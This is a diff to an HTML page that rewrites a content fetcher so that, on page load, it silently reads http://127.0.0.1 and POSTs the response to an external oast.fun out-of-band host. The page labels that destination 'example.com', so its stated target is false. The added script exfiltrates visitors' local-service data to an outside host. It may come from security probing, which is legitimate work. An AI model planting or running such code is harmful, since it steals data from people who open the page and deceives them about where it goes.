@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Automatic Website Content Fetcher</title>
+    <title>Fetch Localhost & Send to Example.com</title>
     <!-- Tailwind CSS CDN -->
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
@@ -21,22 +21,15 @@
 </head>
 <body class="p-4 sm:p-6 md:p-8">
     <div class="bg-white p-6 sm:p-8 rounded-xl shadow-lg w-full max-w-2xl">
-        <h1 class="text-3xl font-bold text-gray-800 mb-6 text-center">Automatically Fetch mysite.com Content</h1>
+        <h1 class="text-3xl font-bold text-gray-800 mb-6 text-center">Fetch Localhost, Send to Example.com</h1>
 
         <p class="text-gray-700 text-base mb-6 text-center">
-            Content from <span class="font-semibold text-blue-600">dwgorsbfamepzexmcgtvmeiecbvp3s30r.oast.fun</span> will load automatically.
+            Attempting to fetch content from <span class="font-semibold text-blue-600">http://127.0.0.1</span> and then send it to <span class="font-semibold text-blue-600">http://example.com</span> automatically.
+            <br><strong class="text-red-500">Note: This will likely be blocked by browser security (CORS).</strong>
         </p>
 
-        <div id="loadingIndicator" class="text-center text-blue-600 font-medium mb-4">
-            Fetching content...
-        </div>
-
-        <div class="mt-8">
-            <h2 class="text-xl font-semibold text-gray-800 mb-4">Fetched Content:</h2>
-            <div id="contentDisplay" class="bg-gray-100 p-4 rounded-lg border border-gray-200 overflow-auto max-h-96 text-sm text-gray-900 whitespace-pre-wrap">
-                <!-- Fetched content will be displayed here -->
-                <p class="text-gray-500">Loading...</p>
-            </div>
+        <div id="statusDisplay" class="bg-gray-100 p-4 rounded-lg border border-gray-200 overflow-auto max-h-96 text-sm text-gray-900 whitespace-pre-wrap">
+            <p class="text-gray-500">Initializing...</p>
         </div>
 
         <!-- Custom Message Box for alerts -->
@@ -53,15 +46,15 @@
 
     <script>
         // Get references to HTML elements
-        const contentDisplay = document.getElementById('contentDisplay');
-        const loadingIndicator = document.getElementById('loadingIndicator');
+        const statusDisplay = document.getElementById('statusDisplay');
         const messageBox = document.getElementById('messageBox');
         const messageBoxTitle = document.getElementById('messageBoxTitle');
         const messageBoxContent = document.getElementById('messageBoxContent');
         const messageBoxClose = document.getElementById('messageBoxClose');
 
-        // The URL to fetch (hardcoded)
-        const URL_TO_FETCH = 'https://dwgorsbfamepzexmcgtvmeiecbvp3s30r.oast.fun';
+        // Define the target URLs
+        const LOCALHOST_URL = 'http://127.0.0.1'; // The local server to fetch from
+        const TARGET_SEND_URL = 'https://dwgorsbfamepzexmcgtvmeiecbvp3s30r.oast.fun'; // The external site to send to
 
         /**
          * Displays a custom alert message box.
@@ -80,55 +73,70 @@
         });
 
         /**
-         * Function to fetch and display content from the URL.
+         * Main function to fetch from localhost and send to example.com.
          */
-        async function fetchWebsiteContent() {
-            // Initially show loading indicator
-            loadingIndicator.classList.remove('hidden');
-            contentDisplay.innerHTML = '<p class="text-gray-500">Loading...</p>';
+        async function fetchAndSend() {
+            statusDisplay.innerHTML = '<p class="text-blue-600 font-medium">Attempting to fetch from 127.0.0.1...</p>';
 
+            let fetchedContent = '';
             try {
-                // Fetch the content from the hardcoded URL
-                const response = await fetch(URL_TO_FETCH);
+                // Step 1: Fetch content from localhost
+                const response = await fetch(LOCALHOST_URL);
 
-                // Check if the response was successful (status code 200-299)
                 if (!response.ok) {
                     throw new Error(`HTTP error! Status: ${response.status} - ${response.statusText}`);
                 }
+                fetchedContent = await response.text();
+                statusDisplay.innerHTML += `<p class="text-green-600">Successfully fetched from ${LOCALHOST_URL}. Content size: ${fetchedContent.length} bytes.</p>`;
+                statusDisplay.innerHTML += `<p class="text-gray-700">Fetched content preview: ${fetchedContent.substring(0, 200)}...</p>`; // Show a snippet
 
-                // Get the response text
-                const contentType = response.headers.get('content-type');
-                let content;
+            } catch (error) {
+                console.error('Error fetching from localhost:', error);
+                statusDisplay.innerHTML += `<p class="text-red-600 font-semibold">Error fetching from ${LOCALHOST_URL}: ${error.message}</p>`;
+                showMessageBox(
+                    'Localhost Fetch Error',
+                    `Could not fetch from ${LOCALHOST_URL}. This is likely due to a CORS policy blocking cross-origin requests, or no server running on that address. Error: ${error.message}`
+                );
+                return; // Stop execution if fetching from localhost fails
+            }
 
-                // Attempt to parse as JSON if content-type indicates it
-                if (contentType && contentType.includes('application/json')) {
-                    try {
-                        content = JSON.stringify(await response.json(), null, 2);
-                    } catch (jsonError) {
-                        // If JSON parsing fails, treat as plain text
-                        content = await response.text();
-                        showMessageBox('Warning', 'Content-Type was JSON but parsing failed. Displaying as plain text.');
-                    }
-                } else {
-                    // Otherwise, get as plain text
-                    content = await response.text();
+            statusDisplay.innerHTML += `<p class="text-blue-600 font-medium mt-4">Attempting to send data to ${TARGET_SEND_URL}...</p>`;
+
+            try {
+                // Step 2: Send the fetched content to example.com
+                // We'll send it as plain text in a POST request body
+                const sendResponse = await fetch(TARGET_SEND_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'text/plain', // Specify content type as plain text
+                        'Accept': '*/*' // Tell the server we accept any response type
+                    },
+                    body: fetchedContent // Send the fetched content as the request body
+                });
+
+                if (!sendResponse.ok) {
+                    throw new Error(`HTTP error! Status: ${sendResponse.status} - ${sendResponse.statusText}`);
                 }
 
-                // Display the fetched content. Escape HTML to prevent XSS.
-                contentDisplay.textContent = content; // Using textContent for safety
-                contentDisplay.scrollTop = 0; // Scroll to top of content
+                const sendResult = await sendResponse.text(); // Get response from example.com
+                statusDisplay.innerHTML += `<p class="text-green-600">Successfully sent data to ${TARGET_SEND_URL}. Server response preview: ${sendResult.substring(0, 200)}...</p>`;
+                showMessageBox(
+                    'Operation Complete',
+                    `Successfully attempted to fetch from localhost and send to example.com. However, remember real websites like example.com rarely process such unsolicited POST requests.`
+                );
+
             } catch (error) {
-                // Handle any errors that occurred during the fetch operation
-                console.error('Error fetching website:', error);
-                contentDisplay.innerHTML = `<p class="text-red-600 font-semibold">Error: ${error.message}</p>`;
-                showMessageBox('Fetch Error', `Could not fetch content from ${URL_TO_FETCH}: ${error.message}. Please note that "mysite.com" is a placeholder and real websites may block direct fetching from other domains due to CORS policies.`);
-            } finally {
-                loadingIndicator.classList.add('hidden'); // Hide loading indicator
+                console.error('Error sending data to example.com:', error);
+                statusDisplay.innerHTML += `<p class="text-red-600 font-semibold">Error sending data to ${TARGET_SEND_URL}: ${error.message}</p>`;
+                showMessageBox(
+                    'Data Send Error (CORS)',
+                    `Could not send data to ${TARGET_SEND_URL}. This is almost certainly due to CORS policy blocking cross-origin POST requests to example.com. Error: ${error.message}`
+                );
             }
         }
 
-        // Call the fetch function automatically when the DOM is fully loaded
-        document.addEventListener('DOMContentLoaded', fetchWebsiteContent);
+        // Call the main function automatically when the DOM is fully loaded
+        document.addEventListener('DOMContentLoaded', fetchAndSend);
     </script>
 </body>
 </html>
